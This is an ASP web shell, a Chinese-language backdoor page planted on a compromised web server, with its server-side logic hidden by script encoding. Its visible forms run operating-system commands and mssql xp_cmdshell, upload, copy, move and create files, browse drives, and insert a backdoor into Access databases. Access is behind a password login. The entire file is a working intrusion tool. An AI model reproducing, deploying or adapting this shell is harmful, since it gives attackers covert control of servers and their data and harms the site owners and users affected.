         <%#@~^ZQAAAA==r6P. ;!+/D`r^:9Jb@!@*JE~Dt+ ~D /wKUd+c MkO+cEÃüÁîÖ´ÐÐ³É¹¦£¬·µ»Ø,@!WW    OP1WsGM'JE:wsT!ZTrJ@*r[N[J@!z6GxD@*~Ìõ¼ÇÂ¼J*6RgAAA==^#~@%>
     </table>
   <%#@~^HgAAAA==@#@&InkwKx/ RAUN@#@&nx9PrW@#@&/wYAAA==^#~@%>
   <%#@~^3wMAAA==@#@&E.^',I+$E dYc?nD7+.#mDkm8V /`ri]Sr#@#@&r0~OMkh`Mn;!+dOc0W.hvJ2lkdSW.9J*#@!@*Jr~l  N~YMkhcM+;!n/DR0K.h`rwm/dhG.9Jb#@!@*J7tC^0JPO4 x~mms^PG!Yv#@#@&k6~YMkh`M+5; /YcWWM:`r2C/khKD[Jbb{J-tm^3rPO4 x@#@&. /2W  d R^KW0k+k`r2lk/AWMNEb{Jl^s+    J@#@&.n/aW  /nR.n9k.+1OPrJ';MV[EE@#@&nVkn,kW,I ;E /D ZKWVk /cEal/kAWMNJ*@!@*JmV^+UJ~O4+U@#@&^l^V~sKokUc*PvÃÜÂë´íÎó@#@&. /2Kxk+R x9~BÍ£Ö¹ÔËÐÐ@#@&nx9PrW@#@&/ s+1YP1Cd+,D ;;+dOvJrNrb@#@&mCd PJn[bYE@#@&^mVs,+9kYv#@#@&mm/nPrE2sKlNr@#@&1lV^~;w^WmNc#@#@&1ld+,ENbDE@#@&mlss,NrDvb@#@&^m/ PJ9WSUJ@#@&^l^V~[Khx^Gl9sk^ncD ;!+dYcEalOtrb#@#@&^Ck+PEr LnmDE@#@&^mV^Pk L ^Yv#@#@&1ldn,+Vkn@#@&ml^s~:mk `b@#@&n N~/ s+1Y@#@& xN~r6@#@&/!8,VGTk  `#@#@&6GD,kx!,YG~y*@#@&Gx,+DMG.PM+kEh+~U 6O@#@&(/}4%x6lVdn@#@&#+M6(LxrJ@#@&Nb:,P+kY64N@#@&d YP:n/Dr4Nxd+M\ D Z.nmYnr(%+1Yc6(LKGO /O`bSZ#b@#@&&0P  8*Gy q!Z*~@!@*P2M.PDt+    @#@&qkr(L~'~PMEn@#@&#+Mr8%,'PPnkY64N 7+.kkKx@#@&k6~. D64N'EE,WD,r/  EV^c#+Mr(LbPO4 x~. .r(LxP /Y68NRC4K;D@#@& x9Pk6@#@&64NKGY /Ocb~ *xqkr4N@#@&r(L:WO+dOvkS&*x. D68N@#@&UnXY@#@&aR4BAA==^#~@%>
   <center>
   <table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder">
   <tr><td>
   <table border=0 width=100% cellspacing=1 cellpadding=0 class="noborder" >
   <tr bgcolor="#EEEEEE" height=18 class="noborder">
   <td width="59%" align=left>&nbsp;·þÎñÆ÷Ãû</td>
   <td width="41%" bgcolor="#EEEEEE">&nbsp;<%=#@~^JgAAAA==] ;; /DR? D7nDjl.km4snk`JU3Ij2I|H)HAJ*Ew0AAA==^#~@%></td>
   </tr>
   <tr bgcolor="#EEEEEE" height=18 class="noborder">
   <td align=left>&nbsp;·þÎñÆ÷IP</td>
   <td>&nbsp;<%=#@~^JQAAAA==] ;; /DR? D7nDjl.km4snk`Jd6ZzS{z99Ir#oQwAAA==^#~@%></td>
   </tr>
   <tr bgcolor="#EEEEEE" height=18 class="noborder">
   <td align=left>&nbsp;·þÎñÆ÷Ê±¼ä</td>
   <td>&nbsp;<%=#@~^AwAAAA==UKhVAEAAA==^#~@%></td>
   </tr>
   <tr bgcolor="#EEEEEE" height=18 class="noborder">
   <td align=left>&nbsp;±¾ÎÄ¼þ¾ø¶ÔÂ·¾¶</td>
   <td>&nbsp;<%=#@~^NgAAAA==d D- Dc:lawmOtvIn;!+dOc?+M-+M.lMrC4^+k`E?/]&nP{g)HAJbbEhMAAA==^#~@%></td>
   </tr>
   <tr bgcolor="#EEEEEE" height=18 class="noborder">
   <td align=left>&nbsp;·þÎñÆ÷²Ù×÷ÏµÍ³</td>
   <td>&nbsp;<%=#@~^HQAAAA==] ;; /DR? D7nDjl.km4snk`J}jJ*XgoAAA==^#~@%></td>
   </tr>
   <tr bgcolor="#EEEEEE" height=18 class="noborder"><%#@~^kwAAAA==@#@&NrsPDF~D Bs/m4^~DtnOb:+@#@&Y8'YbhnD@#@&6W.Prx8POW,X!Z!TT@#@&VdC(mxP8~3Pq@#@& +6D@#@&O {Yr: D@#@&Dt+Dr: 'mkO.`bxD`cPcOyOOF*MFZ!TT,#_T l#&FZb@#@&6iMAAA==^#~@%><td align=left>&nbsp·þÎñÆ÷ÔËËãËÙ¶È²âÊÔ</td>
   <td>&nbsp;<font color=red><%=#@~^BwAAAA==O4+Ob: 8AIAAA==^#~@%> ºÁÃë</font></td>
   </tr>
   </table><center><br>
   <script language="JavaScript">
   function openwin() {
   var newwin=window.open("","newwin","top=0,left=0,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes,width=700,height=600");
   document.form9.action="";
   document.form9.submit();
   return true;}
   </script>
   <script language="JavaScript">
   function char() {
   alert("ÕâÀïÊÇÔÚACESSÊý¾ÝÀï²åÈë±ùºüÀË×ÓµÄºóÃÅ,Ä¬ÈÏÃÜÂëÊÇ#\n³É¹¦µÄÇ°ÌáÊÇÊý¾Ý¿âÊÇaspºó×º£¬²¢ÇÒÃ»ÓÐ´íÂÒasp´úÂë\n");
   window.open("<%=#@~^AwAAAA==;MVUwEAAA==^#~@%>?dbname="+form9.dbname.value);
   self.close();
   return true;}
   </script>
   <form  action="<%=#@~^AwAAAA==;MVUwEAAA==^#~@%>"  name=form9 target="newwin" method="GET">
   <table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder">
     <tr bgcolor="#EEEEEE" height=18 class="noborder">
         <td>&nbspmdb+sqlÊý¾Ý¿â²Ù×÷:</td>
         <td>
   <input type=hidden name=op value="db">
   <input type=text name=dbname value="Provider=SQLOLEDB.1;Persist Security Info=False;Server=127.0.0.1;User ID=sa;Password=lcx;Database=bbs;" size ="40"> <input type="button" value="Ìá½»" onclick="openwin()"> <input type="button" value="²åÈë" onclick="char()"> <input type="button" value="ÌáÊ¾" onclick="prompt('²åÈëÖ»Õë¶ÔACESS²Ù×÷','ä¯ÀÀACESS,ÒªÐ´ÈëMDBµÄ¾ø¶ÔÂ·¾¶£¬Èçd:bbs.mdb;¸ü¸Ä±íµ¥ÖÐ¶ÔÓ¦µÄMSSQL×Ö·û´®¾Í¿ÉÒÔ²Ù×÷sql¿âÁË')"></td></tr></table></form>
   <%#@~^YgsAAA==v,OR O OO O RO ORO ORÔÚ);2?UÊý¾Ý¿âÀïÐ´ÈëC/aºóÃÅ¿ªÊ¼OO RRO O ORORR ORO RO O@#@&GAf.r7+.P{~rn.K\bN+M'trmMWdW6Y B YR}J2GARW TiGlDl~?G;Mmn'r~@#@&N8Um:+x. ;;+kOvJ[(xm:+r#,@#@&U+OPK4%/Kxx,xPU+D7n.R;D lO+68N+^YvEbGr9$cZWUU mOkKUr#@#@&W(LZKx  ZKxU+1YrG  ?YMrxTP',9$fMk7+.P'~94Ulsn@#@&W8%;WxU }wnx@#@&K4%;W xR 6 ^ED+cJ1DnCD+PDC4^+P    GONKh   VGl[s16cxKONKhUsKlNs^XPGV G(Ln1Y*J#@#@&knY,Dd'k+.- DR1.+mY+K8%+1YvJCNG[(R.+1GD9/nOr#@#@&~,P~/$s{Jd V mY,e,WDK:~xKY[GSxVKCN^m6r@#@&dM/cW2+U~k;s~K8L;WUUBF~f@#@&d./cC9NU h@#@&P,P,./vJUWDNGA  VWm[V16J* Cwa+  N^t;U0`^tM$`m/^cr@!Jbb,[~m4.~`CkmvJ/r#*~[,m4D~`Cd1`J1E#*[P14.AvlkmcJ.E*#~[,^tMAcCkm`Err#b[,^4D$vlkm`rwrb#LP^tMAcCkm`rOJ*#[,^4D~`m/^`E~r#b[,^tMAcCkm`E.r#b[,^4D$vlkm`rErb#LP^tMAcCkm`rUJ*#[,^4D~`m/^`ECr#b[,^tMAcCkm`EOr#b[,^4D$vlkm`r'rb#LP^tMAcCkm`rdJ*#[,^4D~`m/^`Enr#b[,^tMAcCkm`E.r#b[,^4D$vlkm`r\rb#LP^tMAcCkm`rnJ*#[,^4D~`m/^`E.r#b[,^tMAcCkm`E~r#b[,^4D$vlkm`rVrb#LP^tMAcCkm`rCJ*#[,^4D~`m/^`EUr#b[,^tMAcCkm`ELr#b[,^4D$vlkm`rErb#LP^tMAcCkm`rCJ*#[,^4D~`m/^`ELr#b[,^tMAcCkm`Enr#b[,^4D$vlkm`r'rb#LP^tMAcCkm`r%J*#[,^4D~`m/^`ECr#b[,^tMAcCkm`E-r#b[,^4D$vlkm`rlrb#LP^tMAcCkm`rdJ*#[,^4D~`m/^`E^r#b[,^tMAcCkm`E.r#b[,^4D$vlkm`rkrb#LP^tMAcCkm`r2J*#[,^4D~`m/^`EOr#b[,^tMAcCkm`E@*r#b[,^4D$vlkm`r+rb#LP^tMAcCkm`r-J*#[,^4D~`m/^`ECr#b[,^tMAcCkm`Esr#b[,^4D$vlkm`r`rb#LP^tMAcCkm`r.J*#[,^4D~`m/^`Enr#b[,^tMAcCkm`E5r#b[,^4D$vlkm`rErb#LP^tMAcCkm`rnJ*#[,^4D~`m/^`Edr#b[,^tMAcCkm`EOr#b[,^4D$vlkm`rRrb#LP^tMAcCkm`rWJ*#[,^4D~`m/^`EGr#b[,^tMAcCkm`E.r#b[,^4D$vlkm`r:rb#LP^tMAcCkm`rcJ*#[,^4D~`m/^`Evr#b[,^tMAcCkm`E:r#b[,^4D$vlkm`rBrb#LP^tMAcCkm`rbJ*#[,^4D~`m/^`EQr#b[,^tMAcCkm`Evr#b[,^4D$vlkm`rBrb#LP^tMAcCkm`rbJ*#[,^4D~`m/^`E@!r#b[,^tMAcCkm`E&r#b[,^4D$vlkm`r/rb#LP^tMAcCkm`r^J*#[,^4D~`m/^`E.r#b[,^tMAcCkm`Err#b[,^4D$vlkm`rwrb#LP^tMAcCkm`rOJ*#[,^4D~`m/^`E@*r#b#@#@&P,P~.kRE2[mYn@#@&~,P~M/cmVK/ @#@&k+OPM/xUKYtbUo@#@&W(%/W   xcmsWdn@#@&d+D~W(L/G    x'UGDtrxT@#@&BR O OO O RO ORO ORR OO RO OO RRO O ORORR ORO RO ORR OÊý¾Ý¿â²Ù×÷½áÊøORR ORO R OR O OO O RO ORO ORR OO RO@#@&B RRO O ORORR ORO RO OÃâWdK´úÂëÐ´ÎÄ¼þ¿ªÊ¼Õë¶ÔÖÐÎÄOORR ORO R OR O OO O RO ORO ORR OO @#@&alY4s^6{YMkh`]n$En/D 0KDhcrwlO4^maJ*b@#@&O 6DVmX'D.ks`]+$EndDR0K.:vJY aOV16r#b@#@&r6PO+XOV16@!@*rJPCU9P2lD4^ma@!@*rJPDt U@#@&Yn6DV^a{D+asl1+`DnaY^mX~E@*ESr7@*J*@#@&D+aO^m6x. wsl1nvYnXY^m6BJ@!E~r7@!J*@#@&O 6Y^^6{D+asCm `D+aYs^X~E[rSJ%[Eb@#@&YnaDV^6{. wsmm `Y 6DsmX~^tM`f**~J%E[1tDvf*#*@#@&Yn6Os16xD 2VmmncD+6Os16Sm4.vFT*~r7JLm4.`8!b#@#@&OnXYV1a'M+w^C^+vY 6OV^aBm4Dvq&*~E?r[m4.vFf#*@#@&/nDPkt+^V{d+M\nDcm.nmY+K8L mYvEdt V^RCw2sbmCYbGxr#@#@&k+Y~d4+sV6G^NnM'kt+^VcUls+dwmmncrZ)'9W1E: UO/,l  N~?nODkUokwf 0C;^YPid Dw¡¸¿ªÊ¼¡¹²Ëµ¥-³ÌÐò'¸½¼þE*@#@&k+DP/4+^s0KV[+MkOns'/4nV^0W^[nDcwmDd+UCs+cJ¼ÇÊÂ±¾csx0Jb@#@&/+O~K4%/4n^Vsbx0P'kt sV6WsN DrO :RTnY^kx0@#@&W(LktnVssbxVRaCY4'E^sNRna J@#@&K8N/4 V^Vk   3cCDTEh+    Ydxrzm,nm4WPr'O+XY^ma[E@*r[2lD4V16'E,[[[n^P^)'CcVU0J@#@&W(Lk4+^Vsk  3 dm\+vEm=-lcsU3r#@#@&dtns^RUlsn/al^nvJmlwr# kDns/ bY :`rlcsx0JbRbx-G0+\ .4@#@&+    [~k6@#@&BRORR ORO RO ORÃâWkW´úÂëÐ´ÎÄ¼þ½áÊøORR ORO R OÃâWkW±íµ¥¿ªÊ¼ OO O RO ORO qSgDAA==^#~@%>
   <table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder"><tr bgcolor="#EEEEEE" height=18 class="noborder" style='table-layout:fixed; word-break:break-all'><td align=left>
   <form action="<%=#@~^IAAAAA==~"+5!+kYRU+M-+M.CDbl8s /`riIdJ#,7woAAA==^#~@%>" method="post">
   <input type=text name=text value="<%=#@~^BgAAAA==9UxpzPvgEAAA==^#~@%>">  <font class=fonts>ÊäÈëÒªä¯ÀÀµÄÄ¿Â¼,×îºóÒª¼Ó\</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
   <input type=text name=text1 value="<%=#@~^BwAAAA==9UxpzF,7wEAAA==^#~@%>">
   copy
   <input type=text name=text2 value="<%=#@~^BwAAAA==9Uxpz ,8AEAAA==^#~@%>"> <font class=fonts>Ä¿Â¼»òÎÄ¼þ(²»Òª¼ÓÄ¿Â¼ºÍÎÄ¼þÃû£©</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
   <input type=text name=text3 value="<%=#@~^BwAAAA==9Uxpz&,8QEAAA==^#~@%>">
   move
   <input type=text name=text4 value="<%=#@~^BwAAAA==9Uxpzc,8gEAAA==^#~@%>"><font class=fonts> Ä¿Â¼»òÎÄ¼þ(²»Òª¼ÓÄ¿Â¼ºÍÎÄ¼þÃû£©</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
   Â·¾¶£º<input type=text name=text5 value="<%=#@~^BwAAAA==9Uxpz*,8wEAAA==^#~@%>" >
   ³ÌÐò£º<input type=text name=text6 value="<%=#@~^BwAAAA==9Uxpzv,9AEAAA==^#~@%>" ><font class=fonts> ²»¿ÉÒÔ¼Ó²ÎÊý</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left><input type="text" name="ok" size=55><font class=fonts> CMDÃüÁî¶Ô»°¿ò</font>
   </td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left><input type=text name=pathlcx size=55><font class=fonts> Â·¾¶ÓëÎÄ¼þÃû</font></td><tr/>
   <tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
   <textarea  cols=80 rows=5 name=textlcx >
   ÒªÉú³ÉµÄÎÄ¼þÄÚÈÝ£¬²»¿ÉÒÔÓÐ»Ø³µ£º
   <%#@~^WgAAAA==~K3x"+$E+kYvEW0Jb@#@&DndaWxknRSDkDn~WUmMk2Ys4 Rn6 ^PvJ^h9R+an,z^Pr',WV*RkYNKED D l[l^V@#@&vRwAAA==^#~@%></textarea>
   <input type=submit name=sb value=·¢ËÍÃüÁî class=input>
   </form></td></tr><%#@~^JQAAAA==v OR O OO O ROÃâ6/G±íµ¥µ¥´úÂë½áÊøO ORR OO RO 1AUAAA==^#~@%>
   <script language=vbs>
   sub main()
   base=document.all.text9.value
   If IsNumeric(base) Then
   cc=hex(cstr(base))
   alert("10½øÖÆÎª"&base)
   alert("16½øÖÆÎª"&cc)
   exit sub
   end if
   aa=asc(cstr(base))
   bb=hex(aa)
   alert("10½øÖÆÎª"&aa)
   alert("16½øÖÆÎª"&bb)
   end sub
   sub main2()
   If document.all.vars.value<>"" Then
   '¶¨ÒåÏà¹Ø±äÁ¿
   Dim nums,tmp,tmpstr,i
   nums=document.all.vars.value   'È¡µÃ´ÓÓÃ»§¶ËÊäÈë½øÀ´µÄ16½øÖÆÊýÖµ
   nums_len=Len(nums)     'µÃ³önumsµÄ³¤¶È
   '¿ªÊ¼Ñ»·£¬´ÎÊýÎªnumsµÄ³¤¶ÈÖµ
   For i=1 To nums_len
       tmp=Mid(nums,i,1)    'È¡³önumsµÄµÚ1¸ö×Ö·û´æ·Åµ½ÁÙÊ±±äÁ¿tmpÖÐ
       If IsNumeric(tmp) Then    'Èç¹ûtmpÖÐµÄÄÚÈÝÊÇÊýÖµÐÍ£¬ÔòÖ´ÐÐÏÂÃæ´úÂë
           tmp=tmp * 16 * (16^(nums_len-i-1))    '´ËÎª16½øÖÆÊýÖµÐÍÊý¾Ý×ª»¯Îª10½øÖÆÊýÖµµÄ¹«Ê½
       Else
           'ÏÞÖÆÊäÈëµÄ16½øÖÆÊýµÄ·¶Î§ÔÚ0--9¼°a--fÖ®¼ä
           If ASC(UCase(tmp))<65 Or ASC(UCase(tmp))>70 Then
               alert("ÄãÊäÈëµÄÊýÖµÖÐÓÐ·Ç·¨×Ö·û£¬16½øÖÆÊýÖ»°üÀ¨1¡«9¼°a¡«fÖ®¼äµÄ×Ö·û£¬ÇëÖØÐÂÊäÈë¡£")
               exit sub
           End If
           tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))    '´ËÎª16½øÖÆ×Ö·û´®ÐÍÊý¾Ý×ª»¯Îª10½øÖÆÊýÖµµÄ¹«Ê½
       End If
           '½«ÉÏÃæ×ª»¯ºóµÄÊýÖµÓëtmpstrÏà¼ÓÀÛ¼Æ³ö×ÜºÍ
           tmpstr=tmpstr+tmp
   Next
   alert("×ª»»µÄ10½øÖÆÎª:"&tmpstr&"Æä×Ö·ûÖµÎª:"&chr(tmpstr))
   End If
   end sub
   </script>
   <input type=text name=text1 value=×Ö·ûºÍÊý×Ö×ª10ºÍ16½øÖÆ size=30 id=text9><input type=submit onclick=main() value="¸øÎÒ×ª">
   <input type="text" name="vars" value=16½øÖÆ×ª10½øÖÆºÍ×Ö·û size=30 id=vars><input type=submit onclick=main2() value="¸øÎÒ×ª"></table>
   </center>
   <br><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8" class="noborder">
   <tr bgcolor="#EEEEEE" height=18 class="noborder">
   <form  action=""  method="post">
   <Input TYPE="TEXT" NAME="SQL" value="<%=#@~^BgAAAA==dDDj5SSQIAAA==^#~@%>" size ="30">
     <Input TYPE="TEXT" NAME="strcon" value="Provider=SQLOLEDB.1;Persist Security Info=False;Server=SQL·þÎñÆ÷ip;UserID=ÓÃ»§Ãû;Password=ÃÜÂë;" size=30 >
   <input TYPE="SUBMIT" value="sqlÀ©Õ¹">&nbsp
   <input type="button"   value="ÌáÊ¾" onClick="prompt('¿ÉÒÔÖ´ÐÐmssqlÀ©Õ¹,¾ÙÀý:exec master.dbo.xp_cmdshell ÃüÁîÓï¾ä','¸ü¸Ä±íµ¥×Ö·û´®ÖÐµÄÏàÓ¦ÖµºóÔÙ½øÐÐ²Ù×÷')" >
   </form></tr></table><br><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8" class="noborder">
   <tr bgcolor="#EEEEEE" height=18 class="noborder"><td>
   <form name="form11" method="post" action=<%=#@~^CAAAAA==WbVn    ls+QQMAAA==^#~@%>?up=yes enctype="multipart/form-data">
   ÒÑÓÐÎïÀíÄ¿Â¼+ÎÄ¼þÃû:
         <input name="filepath" value="d:\test.asp" size="16">
             ÎÄ¼þµØÖ·:
   <input name="file1" type="file"  size="13">
   <input type="submit" name="Submit" value=" ÉÏ´«">
    </form></td></Tr></table>
   </center>
   <%#@~^jAEAAA==v OR O OO O RO OROÃâ6/G´úÂëd4+V^ lawVb^CYbW   ¿ªÊ¼ORORR ORO RO ORR O@#@&9Uxpb,x,In$E /YcsK.:vJO+XYEb,PPEÄ¿Â¼ä¯ÀÀ@#@&b0Pv9jxob,@!@*PEE*P~Y4nx@#@&dnDP/4n^Vx/ .7+.cmM+lD+K8L mO`r/4n^VRm2w^kmmOrW   J*Pv½¨Á¢/4n^V¶ÔÏó@#@&knY,0G[8'/4n^V xmh /2mm `fUxo)#@#@&d+DPWG9kY h/{0W9q kD+s/@#@&WGMPnl14P1W~r    P0G[bYn:k@#@&DnkwKx/ RS.kD+~J@!0GUDPmKsWM'4^C^3@*J,[~mG alOt,'PrORR OJ~',mGRkr.+~LPr@!z6W   O@*@!4.@*r@#@&U 6Y@#@&+ NPbW@#@&6GwAAA==^#~@%>
   <%#@~^TAIAAA==@#@&fj    (zFP{P"n;!+dYcsG.s`JDn6DFJ*~~BÄ¿Â¼¿½±´£¬²»ÄÜ½øÐÐÎÄ¼þ¿½±´@#@&G?U()+,'~I 5E /O wWDhcrYn6D+r#@#@&k6PfUxo)F@!@*EJ,lU[,f?    pby@!@*rE~Y4+   @#@&/nO,/4+^sF{/n.7+D ^M+CY G(Ln1YvJ/4+^sRmw2VbmCObWxrbPE½¨Á¢/t ss¶ÔÏó@#@&/ Y~0G[8'dt sV8RUCs+/2C1+cfUUob+*@#@&0WMPbxV xcfUxp)8#PDGP8P/Dn2P F@#@&r0~hbNcfUU(zFSrBF#xE'J~Y4n @#@&,P,wlDt{s+6YcfUxp)8~k q#@#@&P,~n6bY,0GD@#@& x[PbW@#@&xnaD@#@&rW,Vnxv2mY4*'yPY4+ ~wmY4'alO4,[PrwJ@#@&wmO4 {Dbo4Yc9Uxpb8SV xc9Ux()q*Or#@#@&k+O,0KN {/4nV^F xm:ndalm cwmYt*@#@&/ Y,0GNrO :x0K[ cwC.k+xCh `2lD4y#@#@&0KNFcmK2X4+.+,0G[bY+s@#@&M+/aGU/ RSDrYn~rmG:sCx9P^GswVnO N~/!^1+dk"r@#@& x9~k6@#@&2qUAAA==^#~@%>
   <%#@~^RAIAAA==@#@&fj    (z&P{P"n;!+dYcsG.s`JDn6D&J*~~PEÄ¿Â¼ÒÆ¶¯@#@&fjxp)WPxP"n;!+dOcsW.hvJO+XOWJb@#@&b0PG?  pb2@!@*JrPCU9PfUU(zc@!@*EEPDt x@#@&dnDPdt sVy'dnM\+. 1DnlDnK4% mD`Jkt sVcl2w^k^CDkW E#,B½¨Á¢/4nsV¶ÔÏó@#@&k+OPWG9Fx/4nV^  Um:+d2mmn`Gj   ()W#@#@&0KD,r'^+U`G?Upz&#,OW,FPkOnw,O8@#@&kW~sk[`GjxobfSb~Fbxr-EPD4 x@#@&P,PwmY4xV 0O`G?Upz&~bRF*@#@&,~~+XkDPWW.@#@&+UN,r0@#@&UnXY@#@&r6Ps+ calO4#{ PDt UPalOt{wCO4P[,E-r@#@&aCOty'MkLtOcG?U(zf~^+UcG?xp)2#Rk*@#@&/nDP6WNy'k4+^V+R  lhnkwl1n`alY4b@#@&k+DPWW[rD+h'6GNyR2CM/+UCs+cwmO4 b@#@&6WN8RsG\ tnD PWG9kY h@#@&D+k2Gxk+ch.kOn,J^Wshl   N~^K:wsnD+[Pk;1mnk/eJ@#@&+  [Pb0@#@&EaYAAA==^#~@%>
   <%#@~^NAEAAA==@#@&fj    (z*P{P"n;!+dYcsG.s`JDn6D*J*~~P,BÖ´ÐÐ³ÌÐòÒªÖ¸¶¨Â·¾¶@#@&9?Upzv~',]+$EndDRsG.s`EY aDvE*@#@&k0,fUU(z*@!@*rJ~C   NPGjxobv@!@*EJ,Y4+U@#@&d Y~/4nV^&xd D\n.cm.+mO W8N+1Y`r/4nV^RCwaVr^mYkKUJ*PB½¨Á¢k4nV^¶ÔÏó@#@&/4+ss2RUlsn/al^nvf?Upz*bRbO :dckD+:vfUU(zvbRbx-G0+\ .4@#@&D d2W    / RADrO PEmKh:mx[~1W:2s YnN,d!m^ /k"J@#@& UN,kW@#@&iFgAAA==^#~@%>
   <br><br>
   <center><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8" class="noborder">
   <tr bgcolor="#EEEEEE" height=18 class="noborder">
         <td colspan=2 align=center><form method="POST" action=""&url&"">
   Enter Password£º<input type="password" name="password" size="20">
   <input type="submit" value="LOGIN"></td>
      </tr>
   </form></td></tr></table>
   </center>
   </body>
   <%#@~^BwAAAA==n N~kE(oQIAAA==^#~@%>
   <%#@~^CAAAAA==~ x[,k6PZgIAAA==^#~@%>
   <%#@~^agEAAA==d!4~slbx`*B RO ORO ORR OO RO OO ÃâWdW´úÂë½áÊø£¬6/K´úÂë¿ªÊ¼ORORR ORO RO ORR OORR@#@&;D^2mY4{I ;E /D ? D-+M.C.bl4^n/vJ?A]#2"{gb\2Eb@#@&[ks~malO4BVwCO4@#@&k6~"+5!+kY`rwmOtr#xJrPO4 x@#@&swmYt{E&J@#@& Vd+@#@&^wCY4xI ;;nkY`E2mY4J*'rzE@#@& xN,k6@#@&b0~I ;;nkY`rCYDDk(Eb'rYMEnJ~O4+U@#@&^wmY4x^wlO4@#@&CYD.b4xrYME+r@#@&nVk+@#@&1wCO4'? .\ DRtC2nmY4`swCO4#@#@&mOYMk8xrJ@#@&n   N~k6@#@&+mAAAA==^#~@%><html>
   <script language="JavaScript">
   function crfile(ls)
   {if (ls==""){alert("ÇëÊäÈëÎÄ¼þÃû!");}
   else {window.open("<%=#@~^AwAAAA==;MVUwEAAA==^#~@%>?id=edit&attrib=<%=#@~^EQAAAA==. ;; /D`JmYD.k(JbJAYAAA==^#~@%>&creat=yes&path=<%=#@~^BQAAAA==salO4GQIAAA==^#~@%>"+ls);}
   return false;
   }
   function crdir(ls)
   {if (ls==""){alert("ÇëÊäÈëÎÄ¼þÃû!");}
   else {window.open("<%=#@~^AwAAAA==;MVUwEAAA==^#~@%>?id=dir&attrib=<%=#@~^EQAAAA==. ;; /D`JmYD.k(JbJAYAAA==^#~@%>&op=creat&path=<%=#@~^BQAAAA==salO4GQIAAA==^#~@%>"+ls);}
   return false;
   }
   </script>
   <script language="vbscript">
   sub rmdir(ls)
   if confirm("ÄãÕæµÄÒªÉ¾³ýÕâ¸öÄ¿Â¼Âð!"&Chr(13)&Chr(10)&"Ä¿Â¼Îª£º"&ls)   then
   window.open("<%=#@~^AwAAAA==;MVUwEAAA==^#~@%>?id=dir&path="&ls&"&op=del&attrib=<%=#@~^EQAAAA==. ;; /D`JmYD.k(JbJAYAAA==^#~@%>")
   end if
   end sub
   sub copyfile(sfile)
   dfile=InputBox(""&Chr(13)&Chr(10)&"Ô´ÎÄ¼þ£º"&sfile&Chr(13)&Chr(10)&"ÇëÊäÈëÄ¿±êÎÄ¼þµÄÎÄ¼þÃû:"&Chr(13)&Chr(10)&"Ðí´øÂ·¾¶,Òª¸ù¾ÝÄãµÄµ±Ç°Â·¾¶Ä£Ê½. ×¢Òâ:¾ø¶ÔÂ·¾¶Ê¾Àýc:/»òc:\¶¼¿ÉÒÔ")
   dfile=trim(dfile)
   attrib="<%=#@~^EQAAAA==. ;; /D`JmYD.k(JbJAYAAA==^#~@%>"
   if dfile<>"" then
   if InStr(dfile,":") or InStr(dfile,"/")=1 then
   lp=""
   if InStr(dfile,":") and attrib<>"true" then
   alert "¶Ô²»Æð£¬ÄãÔÚÏà¶ÔÂ·¾¶Ä£Ê½ÏÂ²»ÄÜÊ¹ÓÃ¾ø¶ÔÂ·¾¶"&Chr(13)&Chr(10)&"´íÎóÂ·¾¶£º["&dfile&"]"
   exit sub
   end if
   else
   lp="<%=#@~^BQAAAA==salO4GQIAAA==^#~@%>"
   end if
   window.open(""&url&"?id=edit&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
   else
   alert"ÄúÃ»ÓÐÊäÈëÎÄ¼þÃû£¡"
   end If
   end sub
   </script><body bgcolor="#F5F5F5">
   <TABLE cellSpacing=1 cellPadding=3 width="750" align=center
   bgColor=#b8b8b8 border=0 class="noborder">
   <TBODY>
   <TR >
   <TD
   height=22 colspan="4" bgcolor="#EEEEEE" >ÇÐ»»ÅÌ·û£º
   <%#@~^qgAAAA==@#@&sGMPAlm4PD4k  o~k PG8N0/Kst   RfMr-+k@#@&In/2G    /nRS.kD+~E@!lP4. 0xBr'!DsLJQwlDt{E[DtrxTR9.b\+dnYD+DLEl[mYDDr4xOMEnB@*E[DtrUTRf.r7+J+DO D'rÅÌ)@!zl@*P,~P,P~P,PE@#@&12oP@#@&MjEAAA==^#~@%>   &nbsp;±¾»ú¾ÖÓòÍøµØÖ·£º
   <%=#@~^QgAAAA==~r-wrPLPWUmMrwD1nY^tU ;W:a;Y D1mhnPLPr-EP'~K?^Db2Yg+Os4xRid DHlsn,9BUAAA==^#~@%></td>
   </TR>  <TD colspan="4" bgcolor="#EEEEEE" ><%#@~^AQEAAA==@#@&kW,I ;E /DcJmYODb4Eb{JYM;+rPPD4nx@#@&M+dwGUk+ hMrY PE@!mPt.n6'vJL;MV'rB@*@!0KxD~mKVGD{B:9Z!!ZTB@*µã»÷ÇÐ»»µ½Ïà¶ÔÂ·¾¶±à¼Ä£Ê½@!z6GUY@*@!Jl@*J@#@& Vd+@#@&D /2G    /+ AMkO+,E@!l~4D 0'EJL;D^[EgmYO.b4'D.E B@*@!WGxDP1WsW.xEa9!ZT!ZB@*µã»÷ÇÐ»»µ½¾ø¶ÔÂ·¾¶±à¼Ä£Ê½@!J0WUO@*@!&l@*E@#@&n   N,k0@#@&Kj4AAA==^#~@%>&nbspÂ·¾¶: <%=#@~^BQAAAA==^alO4EAIAAA==^#~@%>  &nbsp;&nbsp;µ±Ç°ä¯ÀÀÄ¿Â¼:<%=#@~^BQAAAA==salO4GQIAAA==^#~@%>
   </TD></TR> <TR>
   <TD height=22 colspan="4" bgcolor="#EEEEEE" >
   <form name="form1" method="post" action="<%=#@~^AwAAAA==;MVUwEAAA==^#~@%>" >
   ä¯ÀÀÄ¿Â¼: <input type="text" name="path" size="30" value="c:">
   <input type="hidden" name="attrib" value="true">
   <input type="submit" name="Submit" value="ä¯ÀÀÄ¿Â¼" > ¡¼ÇëÓÃ¾ø¶ÔÂ·¾¶¡½
